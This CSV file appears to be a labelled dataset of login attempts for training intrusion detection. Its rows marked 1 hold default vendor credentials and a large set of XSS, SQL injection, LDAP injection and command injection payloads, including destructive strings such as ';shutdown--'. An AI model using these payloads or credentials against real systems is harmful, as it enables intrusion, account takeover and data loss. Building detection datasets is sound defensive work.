ip,username,password,label
191.167.164.215,ibm,1qaz!QAZ,1
165.75.252.39,gu,54321e-mail,0
223.204.141.65,tian,!eon302,0
58.44.251.92,"<input type=""text"" value=`` <div/onmouseover='alert(785)'>X</div>","&lt;STYLE&gt;&#46;XSS{background-image&#58;url(\""javascript&#058;alert(904)\"");}&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;",1
145.233.179.35,chen,5th!@#$%^,0
90.184.106.163,luan,@163.combbbb,0
185.233.33.188,USERP,ciwuxe,1
234.57.209.228,&lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=javascript:alert(1823);&quot;&gt;,<brute contenteditable onkeydown=alert(182)>press any key!,1
191.167.164.215,ibm,a5201314,1
226.131.24.95,liang,1/2first,0
26.34.161.34,Liebert,abcABC123,1
165.75.252.39,gu,54321email,0
223.204.141.65,zhan,@qq.com1/3,0
58.44.251.92,"perl -e ';print "";&;<;SCR\0IPT>;alert(1921)<;/SCR\0IPT>;"";;'; >; out","<HTML xmlns:xss><?import namespace=""xss"" implementation=""%(htc)s""><xss:xss>XSS</xss:xss></HTML>"""""",""XML namespace.""),(""""""<XML ID=""xss""><I><B>&lt;IMG SRC=""javas<!-- -->cript:javascript:alert(1607)""&gt;</B></I></XML><SPAN DATASRC=""#xss"" DATAFLD=""B"" DATAFORMATAS=""HTML""></SPAN>",1
145.233.179.35,chen,5th!@#$%^,0
185.233.33.188,USERP,atc456,1
90.184.106.163,luan,@163.combbbb,0
191.167.164.215,ibm,Aa123456789,1
226.131.24.95,liang,1/2first,0
234.57.209.228,žscriptualert(889)ž/scriptu,"<META. HTTP-EQUIV=""refresh""CONTENT=""0;url=javascript.:alert(253);"">",1
26.34.161.34,ESubscriber,1RRWTTOOI,1
165.75.252.39,gu,54321e-mail,0
58.44.251.92,<img src=63 onerror=!function(){alert(63)}()>,<marquee><script>alert(1724)</script></marquee>,1
223.204.141.65,zhan,@qq.com1/3,0
26.34.161.34,ESubscriber,draadloos,1
234.57.209.228,"<IMG SRC=x oncanplaythrough=""alert(1108))"">",<img src ?itworksonchrome?\/onerror = alert(793),1
185.233.33.188,USERP,WINSABRE,1
226.131.24.95,liang,1/2first,0
145.233.179.35,chen,5th!@#$%^,0
191.167.164.215,ibm,service,1
90.184.106.163,luan,@163.combbbb,0
165.75.252.39,gu,54321e-mail,0
58.44.251.92,"<a href=""\xE2\x80\x88javascript:javascript:alert(441)"" id=""fuzzelement441"">test</a>",<!--[if gte IE 4]><SCRIPT>javascript:alert(1604);</SCRIPT><![endif]-->,1
223.204.141.65,zhan,@qZq.com1/3,0
26.34.161.34,ESubscriber,zxcvbnm,1
226.131.24.95,liang,1/2first,0
185.233.33.188,USERP,trendimsa1.0,1
90.184.106.163,luan,@163.combbbb,0
145.233.179.35,chen,5th!@#$%^,0
191.167.164.215,ibm,blablabla,1
234.57.209.228,<scr<script>ipt>alert(1055)</scr</script>ipt><scr<script>ipt>alert(1055)</scr</script>ipt>,"<? foo=""><script>javascript:alert(591)</script>"">",1
165.75.252.39,gu,543s1e-mail,0
223.204.141.65,zhan,@qq.com1/3,0
58.44.251.92,"<iframe onload=location=['javascript:alert(79)'].join("")>",\\'); alert(1789);var x=\',1
26.34.161.34,ESubscriber,admin000,1
185.233.33.188,USERP,INVALID,1
145.233.179.35,chen,5th!@#$%^,0
234.57.209.228,<script>alert(223)</script>,<IMG STYLE='xss:expre\ssion(alert(261))'>,1
191.167.164.215,ibm,mono,1
165.75.252.39,gu,54321e-mail,0
226.131.24.95,liang,1/2first,0
90.184.106.163,luan,@163.combbbb,0
223.204.141.65,zhan,@qq.com1/3,0
58.44.251.92,"<IMG SRC=""jav&#x0A;ascript:alert(1009);"">","<body onpagehide body onpagehide=""javascript:javascript:alert(1234)""></body onpagehide>",1
26.34.161.34,ESubscriber,*3noguru,1
185.233.33.188,uuidd,None,1
145.233.179.35,chen,5th!@#$%^,0
234.57.209.228,"<img src onerror /"" '""= alt=javascript:alert(634)//"">","<BODY BACKGROUND=""javascript:alert(1965)"">",1
191.167.164.215,ibm,hsadb,1
165.75.252.39,gu,54321e-mail,0
223.204.141.65,zhan,@qq.com1/3,0
226.131.24.95,liang,1/2first,0
58.44.251.92,&lt;IMG SRC=javascript&#058;alert(929)&gt;,"<img src=x onerror=\x6292""javascript:alert(629)"">",1
90.184.106.163,luan,@163.combbbb,0
26.34.161.34,MDSYS,userEp,1
185.233.33.188,uuidd,administrator123,1
234.57.209.228,"<HTML xmlns:xss><?import namespace=""xss"" implementation=""%(htc)s""><xss:xss>XSS</xss:xss></HTML>"""""",""XML namespace.""),(""""""<XML ID=""xss""><I><B>&lt;IMG SRC=""javas<!-- -->cript:javascript:alert(693)""&gt;</B></I></XML><SPAN DATASRC=""#xss"" DATAFLD=""B"" DATAFORMATAS=""HTML""></SPAN>","""`'><script>\x00javascript:alert(1410)</script>",1
191.167.164.215,snake,MMO2,1
145.233.179.35,chen,5th!@#$%^,0
223.204.141.65,zhan,@qq.com1/3,0
90.184.106.163,luan,@163.combbbb,0
165.75.252.39,gu,54321e-mail,0
58.44.251.92,"<x '=""foo""><x foo='><img src=x onerror=javascript:alert(585)//'>","\"";alert(735);//",1
226.131.24.95,liang,1/2first,0
26.34.161.34,MDSYS,M3d!aP0rtal,1
185.233.33.188,uuidd,trendimsa1.0,1
145.233.179.35,chen,5th!@#$%^,0
191.167.164.215,snake,2WSXcder,1
234.57.209.228,X<x style=`behavior:url(#default#time2)` onbegin=`javascript:alert(653)` >,"<a href=""\xE2\x80\x85javascript:javascript:alert(482)"" id=""fuzzelement482"">test</a>",1
90.184.106.163,luan,@163.combbbb,0
89.4.15.11,or,\x27,1
226.131.24.95,liang,1/2first,0
58.44.251.92,"</textarea>'""><script>alert(1766)</script>","<iframe onbeforeload iframe onbeforeload=""javascript:javascript:alert(1246)""></iframe onbeforeload>",1
223.204.141.65,zhan,@qq.com1/3,0
26.34.161.34,MDSYS,XLSERVER,1
185.233.33.188,uuidd,enable,1
234.57.209.228,"&lt;IMG SRC=\""jav&#x09;ascript&#058;alert(924);\""&gt;","<IMG SRC=""jav ascript:javascript:alert(1582);"">",1
191.167.164.215,snake,c,1
145.233.179.35,chen,5th!@#$x^,0
90.184.106.163,luan,@163.combbbb,0
226.131.24.95,liang,/2first,0
89.4.15.11,'or select *,';shutdown--,1
223.204.141.65,zhan,@qq.com1/3,0
58.44.251.92,"<IMG SRC=x oncanplay=""alert(1107))"">",<div style=width:1504px;filter:glow onfilterchange=javascript:alert(1504)>x,1
26.34.161.34,MDSYS,654321,1
185.233.33.188,uuidd,bcpb+serial#,1
234.57.209.228,"<IMG SRC=x onreset=""alert(1079))"">","<img \x15141514src=x onerror=""javascript:alert(1514)"">",1
145.233.179.35,chen,5th!@#9$%^,0
191.167.164.215,snake,Any,1
90.184.106.163,luan,@163.combbbb,0
89.4.15.11,having,' or 0=0 #,1
226.131.24.95,liang,1/2first,0
223.204.141.65,zhan,@qq.com1/3,0
58.44.251.92,"<img src=x onerror=\x09""javascript:alert(1540)"">",<x oncut=alert(159)>copy this!,1
26.34.161.34,MDSYS,su@psir,1
185.233.33.188,RDM470,xc3511,1
191.167.164.215,snake,wlsedb,1
234.57.209.228,<?='<SCRIPT>alert(1750)</SCRIPT>'?>,<;IMG SRC=javascript:alert(1911))>;,1
145.233.179.35,chen,5th!@#$%^,0
90.184.106.163,luan,@163.combbbb,0
89.4.15.11,*/*,x' or 1=1 or 'x'='y,1
226.131.24.95,feng,@qq.comwin7,0
223.204.141.65,zhan,@qq.com1/3,0
58.44.251.92,"<a href=""\x13544javascript:javascript:alert(1354)"" id=""fuzzelement1354"">test</a>","<a href=""\xE2\x80\x86javascript:javascript:alert(469)"" id=""fuzzelement469"">test</a>",1
26.34.161.34,MDSYS,ibmcel,1
185.233.33.188,RDM470,PM,1
191.167.164.215,newuser,linga,1
234.57.209.228,"<iframe/src=""data:text/html,<svg &#168516851685;&#168516850;load=alert(1685)>"">","<br size=\""&{alert(1756)}\"">",1
145.233.179.35,chen,5th!@#$%^,0
90.184.106.163,luan,163.combbbb,0
226.131.24.95,feng,@qq.comwin7,0
89.4.15.11,x' AND members.email IS NULL; --,|,1
223.204.141.65,zhan,@qq.com1/3,0
58.44.251.92,</style &#32;><script &#32; :-(>/**/alert(1690)/**/</script &#32; :-(,"&lt;IMG DYNSRC=\""javascript&#058;alert(883)\""&gt;",1
26.34.161.34,luor,1234admin,1
185.233.33.188,RDM470,atc456,1
191.167.164.215,newuser,mtcl,1
234.57.209.228,<IMG SRC=javascript:alert(1959)>,"<img src=""javascript:alert(1501)"">",1
145.233.179.35,chen,5th!@#$%^,0
90.184.106.163,luan,@163.combbbb,0
226.131.24.95,feng,@qq.comwin7,0
89.4.15.11,') or ('x'='x,x' AND userid IS NULL; --,1
223.204.141.65,zhan,@qq.com1/3,0
58.44.251.92,"<img src=x onerror=\x00""javascript:alert(1545)"">","<img \x00src=x onerror=""javascript:alert(611)"">",1
26.34.161.34,luor,@dsl_xilno,1
185.233.33.188,RDM470,MBIU0,1
234.57.209.228,<brute style=font-size:500px onmouseover=alert(194)>0003,--><!-- --\x2361> <img src=xxx:x onerror=javascript:alert(361)> -->,1
191.167.164.215,newuser,PRIMARY,1
145.233.179.35,chen,5th!@#$%^,0
90.184.106.163,luan,@163.combbbb,0
226.131.24.95,feng,@qq.comwin7,0
89.4.15.11,%7C,x' or 1=1 or 'x'='y,1
223.204.141.65,zhan,@qq.com1/3,0
58.44.251.92,"""/><img/onerror=\x22javascript:alert(539)\x22src=xxx:x />",<b <script>alert(1497)</script>0,1
26.34.161.34,luor,tech,1
185.233.33.188,RDM470,cli123.com,1
191.167.164.215,newuser,123456a.,1
234.57.209.228,"<div/onmouseover='alert(1708)'> style=""x:"">","<META HTTP-EQUIV=""Set-Cookie"" Content=""USERID=<SCRIPT>alert(767)</SCRIPT>"">",1
90.184.106.163,luan,@163Jcombbbb,0
145.233.179.35,chen,5th!@#$%^,0
226.131.24.95,feng,@qq.comwin7,0
89.4.15.11,exec xp,",@variable",1
223.204.141.65,zhan,@qq.com1/3,0
90.120.4.149,ao,1/2graphic,0
26.34.161.34,luor,PORTAL30_PUBLIC,1
185.233.33.188,RDM470,icatch99,1
191.167.164.215,newuser,ANS#150,1
5.177.17.218,xiong,ghjkl;100th,0
60.48.70.36,pang,access50%,0
90.184.106.163,luan,@163.combbbb,0
226.131.24.95,feng,@qq.comwin7,0
89.4.15.11,declare @q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q),\x27\x4F\x52 SELECT *,1
90.120.4.149,ao,1/2graphic,0
223.204.141.65,zhan,@qq.com1/3,0
26.34.161.34,luor,CCC,1
185.233.33.188,RDM470,soccer,1
191.167.164.215,newuser,CDEMORID,1
5.177.17.218,xiong,ghjkl;100th,0
90.184.106.163,luan,@163.combbbb,0
60.48.70.36,pang,access50%,0
89.4.15.11,= --,' or (EXISTS),1
226.131.24.95,feng,@qq.comwin7,0
90.120.4.149,ao,1/2graphic,0
223.204.141.65,zhan,@qq.com1/3,0
26.34.161.34,luor,DES,1
185.233.33.188,EXAMPLES,mobilemail,1
191.167.164.215,newuser,enquirypw,1
5.177.17.218,xiong,ghjkl;100th,0
60.48.70.36,pang,access50&,0
90.184.106.163,luan,@163.combbbbE,0
226.131.24.95,feng,@qq.comwin7,0
89.4.15.11,(,(sqlattempt2),1
223.204.141.65,zhan,@*q.com1/3,0
90.120.4.149,ao,1/2graphic,0
178.147.201.106,huo,10%@126.com,0
185.233.33.188,EXAMPLES,Aa868686,1
191.167.164.215,newuser,device,1
5.177.17.218,xiong,2hjkl;100th,0
60.48.70.36,pang,access50%,0
90.184.106.163,luan,@163.combbbb,0
89.4.15.11,or 0=0 --,",@variable",1
226.131.24.95,feng,@qq.comwin7,0
223.204.141.65,zhan,@qq.com1/3,0
90.120.4.149,ao,1/2graphic,0
178.147.201.106,huo,10%@126.com,0
185.233.33.188,EXAMPLES,lucenttech2,1
191.167.164.215,newuser,recover,1
5.177.17.218,xiong,ghjkI;100th,0
60.48.70.36,pang,access50%,0
90.184.106.163,luan,@163.combbbb,0
226.131.24.95,feng,@qq.comwin7,0
89.4.15.11,%7C,' or 0=0 --,1
223.204.141.65,zhan,@qq.com1/3,0
90.120.4.149,ao,1/2graphic,0
178.147.201.106,huo,10%@126.com,0
185.233.33.188,EXAMPLES,lucenttech1,1
191.167.164.215,newuser,dnnadmin,1
5.177.17.218,xiong,ghjkl;100th,0
90.184.106.163,liu,11ghjkl;,0
60.48.70.36,pang,acce7s50%,0
89.4.15.11,%20$(sleep%2050),hi') or ('a'='a,1
226.131.24.95,feng,@qq.comwin7,0
223.204.141.65,zhan,@qq.com1/3,0
90.120.4.149,ao,1/2graphic,0
178.147.201.106,huo,10%@126.com,0
185.233.33.188,EXAMPLES,REMOTE,1
191.167.164.215,sysuser,PRINTER,1
5.177.17.218,xiong,ghjkl;100th,0
60.48.70.36,pang,access50%,0
90.184.106.163,liu,11ghjkl;,0
226.131.24.95,feng,@qq.comwin7,0
89.4.15.11,%28,--';,1
223.204.141.65,zhan,@qq.com1/3,0
90.120.4.149,ao,1/2graphi)c,0
178.147.201.106,huo,10%@126.com,0
185.233.33.188,EXAMPLES,UI-PSWD-02,1
191.167.164.215,sysuser,FELDTECH,1
5.177.17.218,xiong,ghjkl;100th,0
90.184.106.163,liu,11ghjkl;,0
60.48.70.36,pang,access50%,0
226.131.24.95,feng,@qq.comwin7,0
89.4.15.11,@variable,asc,1
223.204.141.65,zhan,@qq.com1/3,0
90.120.4.149,ao,1/2graphic,0
178.147.201.106,huo,10%@126.com,0
185.233.33.188,EXAMPLES,mlusr,1
5.177.17.218,xiong,ghjkl;100th,0
191.167.164.215,sysuser,ROBELLE,1
60.48.70.36,pang,access50%,0
90.184.106.163,liu,11ghjkl;,0
226.131.24.95,feng,@qq.comwin7,0
89.4.15.11,to_timestamp_tz,-,1
223.204.141.65,zhan,@qq.com1/3,0
90.120.4.149,ao,1/2graphic,0
178.147.201.106,huo,10%@126.com,0
185.233.33.188,EXAMPLES,instrument,1
5.177.17.218,xiong,ghjkl;100th,0
191.167.164.215,sysuser,topadmin,1
90.184.106.163,liu,11ghjkl;,0
60.48.70.36,pang,access50%,0
226.131.24.95,feng,@qq.comwin7,0
89.4.15.11,?,' or 0=0 #,1
223.204.141.65,zhan,@qq.]om1/3,0
90.120.4.149,ao,1/2graphic,0
178.147.201.106,huo,10%@126.com,0
185.233.33.188,viewuser,efmukl,1
5.177.17.218,xiong,ghjkl;100th,0
191.167.164.215,sysuser,nE7jA%5m,1
90.184.106.163,liu,11ghjkl;,0
60.48.70.36,pang,access50%,0
89.4.15.11,\x3D \x27,'or''=',1
226.131.24.95,feng,@qq.comwin7,0
223.204.141.65,zhan,@qq.com1/3,0
90.120.4.149,ao,1/2graphicY,0
178.147.201.106,huo,10%@126.com,0
185.233.33.188,viewuser,1q2w3e4r5t,1
191.167.164.215,sysuser,amigosw1,1
5.177.17.218,xiong,ghjkl;100th,0
60.48.70.36,pang,access50%,0
90.184.106.163,liu,11ghjkl;,0
226.131.24.95,feng,@qq.comwin7,0
89.4.15.11,%20$(sleep%2050),hi' or 1=1 --,1
90.120.4.149,ao,1/2graphic,0
223.204.141.65,zhan,@qq.com1/3,0
185.233.33.188,viewuser,peribit,1
178.147.201.106,huo,10%@126.com,0
191.167.164.215,sysuser,12871,1
5.177.17.218,xiong,ghjkl;100th,0
90.184.106.163,liu,11ghjkl;,0
60.48.70.36,pang,access50%,0
226.131.24.95,feng,@qq.comwin7,0
89.4.15.11,hi' or 1=1 --,""" or 0=0 --",1
223.204.141.65,su,dddddd100%,0
90.120.4.149,ao,1/2Araphic,0
185.233.33.188,viewuser,2222,1
178.147.201.106,huo,10%@126.comi,0
191.167.164.215,sysuser,5201314a,1
5.177.17.218,xiong,ghjkl;100th,0
90.184.106.163,liu,11ghjkl;,0
60.48.70.36,pang,access50%,0
226.131.24.95,feng,@qq.comwin7,0
89.4.15.11,' and '' like ',tz_offset,1
223.204.141.65,su,dddddd100%,0
90.120.4.149,ao,1/2graphic,0
178.147.201.106,huo,10%@126.com,0
185.233.33.188,viewuser,supportpw,1
5.177.17.218,xiong,ghjkl;100th,0
191.167.164.215,sysuser,CIS,1
90.184.106.163,liu,11ghjkl;,0
60.48.70.36,pang,access50%,0
226.131.24.95,feng,@qq.comwin7,0
89.4.15.11,""" or 1=1 or """"=""",replace,1
90.120.4.149,ao,1/2graphic,0
223.204.141.65,su,dddddd100%,0
185.233.33.188,viewuser,XPRT,1
178.147.201.106,huo,10%@126.com,0
191.167.164.215,sysuser,PM,1
5.177.17.218,xiong,ghjkl;100th,0
60.48.70.36,pang,access50%,0
90.184.106.163,liu,11ghjkl;,0
111.148.148.102,desc,'or select *,1
89.4.15.11,' UNION ALL SELECT,?,1
223.204.141.65,su,dddddd100%,0
90.120.4.149,ao,1/2graphic,0
185.233.33.188,viewuser,mp3mystic,1
178.147.201.106,huo,10%@126.com,0
5.177.17.218,xiong,ghjkl;100th,0
191.167.164.215,RSCS,dev,1
60.48.70.36,pang,access50%,0
90.184.106.163,liu,11ghjkl;,0
111.148.148.102,' AnD '' like ',' or ''=',1
89.4.15.11,//,' (select top 1,1
223.204.141.65,su,dddddd100%,0
90.120.4.149,ao,1/2graphic,0
185.233.33.188,viewuser,HLT,1
178.147.201.106,huo,10%@126.com,0
191.167.164.215,RSCS,private,1
5.177.17.218,xiong,ghjkl;100th,0
60.48.70.36,pang,access50%,0
90.184.106.163,liu,11ghjkl;,0
111.148.148.102,' UNION SELECT,or%201=1 --,1
89.4.15.11,&,PRINT,1
223.204.141.65,su,dddddd100%,0
90.120.4.149,ao,1/2graphic,0
185.233.33.188,viewuser,dlanrecover,1
178.147.201.106,huo,10%@126.com,0
5.177.17.218,xiong,ghjkl;100th,0
191.167.164.215,RSCS,gopher,1
90.184.106.163,liu,11ghjkl;,0
60.48.70.36,pang,access50%,0
111.148.148.102,'||UTL_HTTP.REQUEST,%2A%28%7C%28mail%3D%2A%29%29,1
89.4.15.11,\x3D \x3B',' or 1=1 or ''=',1
223.204.141.65,su,dddddd100%,0
90.120.4.149,ao,1//graphic,0
178.147.201.106,huo,10%@26.com,0
185.233.33.188,e500,technolgi,1
5.177.17.218,xiong,ghjkl;100th,0
191.167.164.215,RSCS,P@55w0rd!,1
90.184.106.163,liu,1A1ghjkl;,0
60.48.70.36,pang,access50%,0
111.148.148.102,%2A%28%7C%28mail%3D%2A%29%29,--,1
89.4.15.11,' or 1=1 or ''=',""") or (""a""=""a",1
223.204.141.65,su,dddddd100%,0
90.120.4.149,ao,1/2graphic,0
178.147.201.106,huo,10%@126.com,0
185.233.33.188,e500,5iveL!fe,1
5.177.17.218,xiong,mhjkl;100th,0
191.167.164.215,RSCS,informix,1
90.184.106.163,liu,11ghjkl;,0
111.148.148.102,a' waitfor delay '0:0:10'--,PRINT @@variable,1
89.4.15.11,order by,'; exec xp_regread,1
60.48.70.36,pang,access50%,0
90.120.4.149,di,h_froeschl7,0
223.204.141.65,su,dddddd100%,0
185.233.33.188,e500,qaz123123,1
178.147.201.106,huo,10%@126.com,0
5.177.17.218,xiong,ghjkl;100th,0
191.167.164.215,RSCS,123qaz,1
90.184.106.163,liu,11ghjkl;,0
111.148.148.102,' or (EXISTS),"""",1
60.48.70.36,pang,access50%,0
89.4.15.11,a',limit,1
223.204.141.65,su,dddddd100%,0
90.120.4.149,di,h_froeschl7,0
185.233.33.188,e500,XLSERVER,1
178.147.201.106,huo,10%@126.com,0
5.177.17.218,xiong,ghjkl;100th,0
191.167.164.215,RSCS,wlpisystem,1
90.184.106.163,liu,11ghjkl;,0
111.181.130.9,ibm,NETFRAME,1
60.48.70.36,pang,access50%,0
111.148.148.102,' or userid like '%,'sqlattempt1,1
90.120.4.149,di,h_froeschl7,0
223.204.141.65,su,dddddd100%,0
185.233.33.188,e500,questra,1
178.147.201.106,huo,10'@126.com,0
5.177.17.218,xiong,ghjkl;100th,0
191.167.164.215,RSCS,tivoli,1
90.184.106.163,liu,11ghjkl;,0
60.48.70.36,cui,f333333.net,0
111.181.130.9,ibm,etas,1
223.204.141.65,su,dddddd100%,0
111.148.148.102,insert,tz_offset,1
90.120.4.149,di,h_froeschl7,0
185.233.33.188,e500,snake,1
178.147.201.106,huo,10%@126.com,0
5.177.17.218,xiong,ghjkl;100th,0
191.167.164.215,RSCS,honey,1
90.184.106.163,liu,11ghjkl;,0
111.181.130.9,ibm,CantTouchThis,1
60.48.70.36,cui,3333333.net,0
223.204.141.65,su,ddddnd100%,0
111.148.148.102,hi or a=a,' or '1'='1'--,1
90.120.4.149,di,h_froeschl7,0
25.97.124.103,dang,isi-wbc11,0
178.147.201.106,huo,10%@126.com,0
191.167.164.215,RSCS,?award,1
5.177.17.218,xiong,ghjkl;100th,0
90.184.106.163,liu,11ghjvl;,0
60.48.70.36,cui,3333333.net,0
111.181.130.9,ibm,Aa123456@,1
90.120.4.149,di,h_froeschl7,0
223.204.141.65,su,dddddd100%,0
111.148.148.102,/,like,1
178.147.201.106,huo,10%@126.com,0
25.97.124.103,dang,isi-wbc11,0
5.177.17.218,xiong,ghjkl;100th,0
191.167.164.215,PBX,leadsec,1
90.184.106.163,liu,11ghjkl;,0
60.48.70.36,cui,3333333.net,0
111.181.130.9,ibm,VIRUSER,1
111.148.148.102,' or username like '%,declare @q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q),1
223.204.141.65,su,dddddd100%,0
90.120.4.149,di,h_froeschl7,0
178.147.201.106,huo,10%@126.com,0
25.97.124.103,dang,isi-wbc11,0
5.177.17.218,xiong,ghjkl;100th,0
90.184.106.163,liu,11ghjkl;,0
191.167.164.215,PBX,OUTLN,1
60.48.70.36,cui,333333.net,0
111.181.130.9,ibm,engineer,1
111.148.148.102,admin'--,= ',1
223.204.141.65,su,dddddd100%,0
90.120.4.149,di,h_froeschl7,0
25.97.124.103,dang,isi-wbc11,0
178.147.201.106,qiu,@126.comopen,0
5.177.17.218,xiong,ghjkl;100th,0
191.167.164.215,PBX,Airaya,1
144.77.102.150,RSCS,truetime,1
60.48.70.36,cui,3333333.net,0
111.181.130.9,ibm,j09F,1
111.148.148.102,' and 2>1--,like,1
223.204.141.65,su,dddddd100%,0
90.120.4.149,di,h_froeschl7,0
25.97.124.103,dang,isi-wbc11,0
178.147.201.106,qiu,@126.coopen,0
186.140.104.51,%2A%28%7C%28mail%3D%2A%29%29,@variable,1
191.167.164.215,PBX,correct,1
144.77.102.150,RSCS,phpreactor,1
60.48.70.36,cui,3333333.net,0
111.181.130.9,ibm,software,1
223.204.141.65,su,dddddd100%,0
111.148.148.102,%27%20or%201=1,23 OR 1=1,1
90.120.4.149,di,h_froeschl7,0
178.147.201.106,qiu,@126.comopen,0
25.97.124.103,dang,isi-wbc11,0
186.140.104.51,""" or 1=1--",') and ('x'='x,1
191.167.164.215,PBX,s123456,1
144.77.102.150,RSCS,UI-PSWD-01,1
60.48.70.36,cui,3333333.net,0
111.181.130.9,ibm,QDBA,1
90.120.4.149,di,h_froeschl7,0
223.204.141.65,su,dddddd10%,0
111.148.148.102,//,%20'sleep%2050',1
25.97.124.103,dang,isi-wbc11,0
178.147.201.106,qiu,@126.comopen,0
191.167.164.215,PBX,ABCD,1
186.140.104.51,tz_offset,'hi' or 'x'='x';,1
144.77.102.150,RSCS,barney,1
60.48.70.36,cui,333333.net,0
111.181.130.9,SH,SW_AWARD,1
223.204.141.65,su,dddddd100%,0
111.148.148.102,%29,'or'='or',1
90.120.4.149,di,h_froeschl7,0
25.97.124.103,dang,isi-wbc11,0
178.147.201.106,qiu,@126.comopen,0
144.77.102.150,RSCS,xceladmin,1
186.140.104.51,%2A%28%7C%28objectclass%3D%2A%29%29,' or userid like '%,1
191.167.164.215,PBX,TURBINE,1
60.48.70.36,cui,3333333.net,0
111.181.130.9,SH,ax400,1
223.204.141.65,su,dddddd100%,0
111.148.148.102,*(|(objectclass=*)),or 1=1--,1
90.120.4.149,di,h_froeschl7,0
25.97.124.103,dang,isi-wbc11,0
178.147.201.106,qiu,@126.comopen,0
186.140.104.51,--sp_password,exec sp,1
191.167.164.215,PBX,PRODCICS,1
144.77.102.150,RSCS,MAILER,1
60.48.70.36,cui,3333333.net,0
111.181.130.9,SH,aPAf,1
111.148.148.102,@variable,hi' or 'a'='a,1
66.43.121.234,"<a href=""javas\x0374cript:javascript:alert(374)"" id=""fuzzelement374"">test</a>","<a href=""javas\x02cript:javascript:alert(1270)"" id=""fuzzelement1270"">test</a>",1
90.120.4.149,di,h_froeschl7,0
178.147.201.106,qiu,@126.comopen,0
25.97.124.103,dang,isi-wbc11,0
191.167.164.215,PBX,234,1
186.140.104.51,' or ''=',@variable,1
144.77.102.150,RSCS,hs7mwxkk,1
60.48.70.36,cui,3333333.net,0
111.181.130.9,SH,D-Link,1
66.43.121.234,<INPUT TYPE=”IMAGE” SRC=”javascript:alert(851);”>,"ABC<div style=""x:\xE3\x80\x80expression(javascript:alert(414)"">DEF",1
111.148.148.102,%28,distinct,1
90.120.4.149,di,h_froeschl7,0
25.97.124.103,dang,isi-wbc11,0
178.147.201.106,qiu,@126.comopen,0
141.158.95.201,"<HTML><BODY><?xml:namespace prefix=""t"" ns=""urn:schemas-microsoft-com:time""><?import namespace=""t"" implementation=""#default#time2""><t:set attributeName=""innerHTML"" to=""XSS&lt;SCRIPT DEFER&gt;alert(957)&lt;/SCRIPT&gt;""></BODY></HTML>","<XSS STYLE=""xss:expression(javascript:alert(1600))"">",1
186.140.104.51,anything' OR 'x'='x,',1
144.77.102.150,RSCS,$easyWinArt4,1
60.48.70.36,cui,3333333.net,0
111.181.130.9,SH,EyesOfNetwork,1
111.148.148.102,' or 0=0 --,declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s),1
66.43.121.234,"<body onPageHide body onPageHide=""javascript:javascript:alert(304)""></body onPageHide>","""`'><script>\xE2\x80\xAFjavascript:alert(1419)</script>",1
90.120.4.149,di,h_froeschl7,0
25.97.124.103,dang,isi-wbc11,0
178.147.201.106,qiu,@126.comopen,0
141.158.95.201,"<IMG SRC=x onmousemove=""alert(1089))"">","<DIV STYLE=""background-image: url(javascript:alert(1042))"">",1
186.140.104.51,' or uid like '%,) or (a=a,1
144.77.102.150,RSCS,w0rkplac3rul3s,1
60.48.70.36,cui,3333333.net,0
111.181.130.9,apc,ORAREGSYS,1
66.43.121.234,"""'`><\x3Cimg src=xxx:x onerror=javascript:alert(394)>",<form><button formaction=javascript&colon;alert(1176)>CLICKME,1
111.148.148.102,' or (EXISTS),'hi' or 'x'='x';,1
90.120.4.149,di,h_froeschl7,0
178.147.201.106,qiu,@126.comopen,0
25.97.124.103,dang,isi-wbc11,0
141.158.95.201,"<body onkeydown body onkeydown=""javascript:javascript:alert(346)""></body onkeydown>","<img src\x09=x onerror=""javascript:alert(612)"">",1
186.140.104.51,limit,desc,1
144.77.102.150,RSCS,REP_OWNER,1
60.48.70.36,cui,3333333.net,0
111.181.130.9,apc,555555,1
66.43.121.234,"`""'><img src=xxx:x onerror\x0C=javascript:alert(1470)>","<IMG SRC=x onkeypress=""alert(1084))"">",1
111.148.148.102,"""' or 1 --'""",' ;,1
90.120.4.149,di,h_froeschl7,0
178.147.201.106,qiu,@126.comopen,0
25.97.124.103,dang,isi-wbc11,0
141.158.95.201,"<title onPropertyChange title onPropertyChange=""javascript:javascript:alert(1194)""></title onPropertyChange>",%253cscript%253ealert(845)%253c/script%253e,1
144.77.102.150,IMAGEUSER,elux,1
